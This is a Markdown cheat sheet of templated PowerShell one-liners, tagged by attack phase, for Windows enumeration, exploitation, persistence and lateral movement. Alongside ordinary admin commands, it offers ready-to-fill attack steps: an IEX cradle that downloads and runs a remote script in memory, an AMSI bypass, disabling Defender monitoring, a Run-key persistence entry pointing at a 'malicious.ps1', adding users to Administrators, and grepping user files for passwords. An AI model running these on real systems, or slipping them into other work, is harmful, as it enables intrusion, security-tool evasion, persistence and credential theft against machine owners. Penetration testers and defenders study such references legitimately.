# Windows PowerShell

> PowerShell cmdlets and one-liners for enumeration, post-exploitation, persistence, and lateral movement (Get-*/Set-*/New-* cmdlets, Invoke-Command, PSRemoting, WinRM, IEX cradles, sls/Where-Object pipelines).

<!-- tags: windows, powershell, post, enum, cmdlets -->

---

## reveal hidden items windows
Show hidden items including dotfiles and system files.

```bash
gci -force {{PATH:str:.}}
```

<!-- meta: risk=safe | phase=enum | tags=powershell,gci,hidden -->

---

## download file windows iwr
Download a file from a remote URL to disk.

```bash
iwr -Uri {{URL:url}} -OutFile {{OUTFILE:file:C:\\Users\\Public\\file.exe}}
```

<!-- meta: risk=med | phase=post | tags=powershell,iwr,download -->

---

## iex download cradle windows
Download and execute a PowerShell script in memory.

```bash
powershell -ep bypass -nop -c "IEX (IWR {{URL:url}} -UseBasicParsing)"
```

<!-- meta: risk=high | phase=exploit | tags=powershell,iex,cradle -->

---

## encoded command windows powershell
Base64-encode a command and run it via -EncodedCommand.

```bash
powershell -NoProfile -EncodedCommand $([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('{{CMD:str:whoami}}')))
```

<!-- meta: risk=med | phase=exploit | tags=powershell,encoded,obfuscate -->

---

## bypass amsi windows
Disable AMSI for the current PowerShell session.

```bash
powershell -nop -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
```

<!-- meta: risk=high | phase=exploit | tags=amsi,bypass,evasion -->

---

## disable defender windows
Disable Defender real-time monitoring (requires admin).

```bash
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
```

<!-- meta: risk=high | phase=post | tags=defender,disable,evasion -->

---

## persist run key windows
Add a registry Run value for current-user persistence.

```bash
powershell -c "Set-ItemProperty -Path 'HKCU:\\{{KEYPATH:str:Software\\Microsoft\\Windows\\CurrentVersion\\Run}}' -Name '{{NAME:str:Updater}}' -Value '{{CMD:str:powershell.exe -ExecutionPolicy Bypass -File C:\\malicious.ps1}}'"
```

<!-- meta: risk=high | phase=post | tags=registry,run,persistence -->

---

## exec remote invoke-command windows
Run a script block on a remote host via PSRemoting.

```bash
powershell -c "Invoke-Command -ComputerName {{TARGET:str}} -ScriptBlock { {{CMD:str:Get-Process}} }"
```

<!-- meta: risk=med | phase=post | tags=powershell,invoke,remote -->

---

## list shares wmi windows
Enumerate SMB shares on a host via WMI.

```bash
powershell -c "Get-WmiObject -Class Win32_Share -ComputerName {{TARGET:str:.}}"
```

<!-- meta: risk=safe | phase=enum | tags=powershell,smb,shares -->

---

## read security eventlog windows
Retrieve recent Security event log entries.

```bash
powershell -c "Get-EventLog -LogName Security -Newest {{COUNT:int:50}}"
```

<!-- meta: risk=safe | phase=enum | tags=eventlog,security,audit -->

---

## list local users powershell
Enumerate local user accounts via the PowerShell cmdlet.

```bash
Get-LocalUser
```

<!-- meta: risk=low | phase=enum | tags=powershell,localuser,accounts -->

---

## list local groups powershell
List all local groups on the host.

```bash
Get-LocalGroup
```

<!-- meta: risk=low | phase=enum | tags=powershell,localgroup,groups -->

---

## list local group members powershell
Show the members of a local group such as Administrators.

```bash
Get-LocalGroupMember -Name "{{GROUP:str:Administrators}}"
```

<!-- meta: risk=low | phase=enum | tags=powershell,localgroup,members -->

---

## create local user powershell
Create a new local user account with no password set.

```bash
New-LocalUser -Name "{{USERNAME:str}}" -NoPassword
```

<!-- meta: risk=med | phase=post | tags=powershell,localuser,create -->

---

## set local user password powershell
Set the password on an existing local user account.

```bash
$Password = Read-Host -AsSecureString; Set-LocalUser -Name "{{USERNAME:str}}" -Password $Password
```

<!-- meta: risk=med | phase=post | tags=powershell,localuser,password -->

---

## add local admin powershell
Add a user to a local group such as Administrators for privilege escalation.

```bash
Add-LocalGroupMember -Group "{{GROUP:str:Administrators}}" -Member "{{USERNAME:str}}"
```

<!-- meta: risk=med | phase=privesc | tags=powershell,localgroup,admin -->

---

## remote pssession windows
Open an interactive remote PowerShell session over WinRM with explicit credentials.

```bash
Enter-PSSession -ComputerName {{COMPUTER:str:DC01}} -Credential {{USERNAME:str}} -Authentication Negotiate
```

<!-- meta: risk=med | phase=post | tags=powershell,winrm,pssession,lateral -->

---

## test winrm windows
Check whether the WinRM service is reachable on a remote host.

```bash
Test-WSMan -ComputerName {{COMPUTER:str:DC01}}
```

<!-- meta: risk=low | phase=enum | tags=powershell,winrm,wsman -->

---

## list openssh capability windows
Query available OpenSSH client/server capabilities on the host.

```bash
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
```

<!-- meta: risk=low | phase=enum | tags=powershell,openssh,capability -->

---

## install openssh client windows
Install the OpenSSH client as an optional Windows capability.

```bash
Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
```

<!-- meta: risk=med | phase=post | tags=powershell,openssh,install -->

---

## search files for passwords powershell
Recursively search user files for credential-related strings.

```bash
Get-ChildItem -Path {{PATH:str:C:\Users}} -Filter "*.txt" -Recurse -File | sls "{{PATTERN:str:Password}}","credential","key"
```

<!-- meta: risk=low | phase=post | tags=powershell,creds,search,sls -->

---

## find sensitive files powershell
Recursively list script and text files under a path, ignoring access errors.

```bash
Get-ChildItem -Path {{PATH:str:C:\Users}} -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.txt" -or $_.Name -like "*.ps1")}
```

<!-- meta: risk=low | phase=post | tags=powershell,files,search -->

---

## test port test-netconnection
Test TCP connectivity to a specific port on a remote host.

```bash
Test-NetConnection -ComputerName {{COMPUTER:str:DC01}} -Port {{PORT:port:445}}
```

<!-- meta: risk=low | phase=enum | tags=powershell,port,connectivity -->

---

## get registered owner windows
Retrieves the name of the registered owner from the Windows Registry

```bash
(Get-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion").RegisteredOwner
```

<!-- meta: risk=safe | phase=recon | tags=windows,powershell,recon,registry,owner -->

---

## list loaded powershell modules
Lists all PowerShell modules currently loaded in the active session

```bash
Get-Module
```

<!-- meta: risk=safe | phase=recon | tags=windows,powershell,modules,recon -->

---

## load windows module
Loads external commands into your PowerShell session

```bash
Import-Module {{MODULE_NAME:str}}
```

<!-- meta: risk=safe | phase=misc | tags=Modules,Powershell,Windows,Import -->
